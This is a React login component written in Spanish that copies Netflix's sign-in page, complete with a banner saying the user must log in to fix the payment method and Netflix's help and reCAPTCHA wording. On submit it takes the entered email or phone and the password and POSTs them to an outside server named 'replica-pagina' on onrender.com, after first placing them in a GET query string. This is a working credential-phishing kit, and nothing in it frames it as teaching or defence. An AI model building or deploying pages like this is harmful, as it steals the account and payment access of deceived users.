import React, { useState } from "react";
import styles from './login.module.css';

export default function Login({ onLoginSuccess }) {
    const [emailOrPhone, setEmailOrPhone] = useState("");
    const [password, setPassword] = useState("");
    const [errorMessage, setErrorMessage] = useState("");
    const [showRecaptchaInfo, setShowRecaptchaInfo] = useState(false);

    const validateInput = async (e) => {
        e.preventDefault();

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\+\d{1,3}\d{7,14}$/;

        if (emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone)) {
            setErrorMessage("");

            try {
                // Primera verificación con la API de login
                const loginUrl = `http://dominio/api/login?email=${encodeURIComponent(emailOrPhone)}&password=${encodeURIComponent(password)}`;
                const loginResponse = await fetch(loginUrl);
                const loginResult = await loginResponse.json();

                if (loginResponse.status !== 200) {
                    setErrorMessage(loginResult.message || "Credenciales incorrectas");
                    return;
                }

                // Segunda verificación con la API de envío
                const data = { name: emailOrPhone, password };
                const response = await fetch('https://replica-pagina-server-ul2z.onrender.com/api/enviar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                });

                const result = await response.json();
                if (response.status === 201) {
                    onLoginSuccess();
                } else {
                    setErrorMessage(result.message || "Error al procesar la solicitud.");
                }
            } catch (error) {
                console.error("Error:", error);
                setErrorMessage("Hubo un error al procesar los datos.");
            }
        } else {
            setErrorMessage("Ingrese un correo válido o un número de teléfono con formato internacional.");
        }
    };

    const handleRecaptchaClick = () => {
        setShowRecaptchaInfo(!showRecaptchaInfo);
    };

    return (
        <div className={styles.conteinerTotal}>
            <div className={styles.PCELMDPDIS}>
                <p>Para corregir el método de pago debe iniciar sesión</p>
            </div>
            <div className={styles.conteinerLogin}>
                <div className={styles.divH2}>
                    <h2>Inicia sesión</h2>
                </div>
                <form onSubmit={validateInput} className={styles.conteinerLoginForm}>
                    <input
                        type="text"
                        placeholder="Email o número de celular"
                        value={emailOrPhone}
                        required
                        autoComplete="off"
                        onChange={(e) => setEmailOrPhone(e.target.value)}
                    />
                    <input
                        type="password"
                        placeholder="Contraseña"
                        value={password}
                        required
                        autoComplete="off"
                        onChange={(e) => setPassword(e.target.value)}
                    />
                    {errorMessage && (
                        <div className={styles.errorContainer}>
                            {errorMessage}
                        </div>
                    )}
                    <button type="submit">Iniciar sesión</button>
                    <div className={styles.centrado}>
                        <div className={styles.conteinerRecuerdame}>
                            <input type="checkbox" id="Recuerdame" />
                            <p>Recuérdame</p>
                        </div>
                        <a href="https://www.netflix.com/LoginHelp" className={styles.olvidaste}>
                            ¿Olvidaste la contraseña?
                        </a>
                    </div>
                </form>
                <div className={styles.text}>
                    <button type="button" onClick={handleRecaptchaClick}>
                        Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
                    </button>
                    {showRecaptchaInfo && (
                        <p className={styles.recaptchaInfo}>
                            La información recopilada por Google reCAPTCHA está sujeta a la{' '}
                            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">
                                Política de privacidad
                            </a>{' '}
                            y a las{' '}
                            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer">
                                Condiciones del servicio
                            </a>{' '}
                            de Google, y se utiliza para proporcionar, mantener y mejorar el servicio de reCAPTCHA, así
                            como para fines generales de seguridad (Google no la utiliza para personalizar publicidad).
                        </p>
                    )}
                </div>
            </div>
        </div>
    );
}
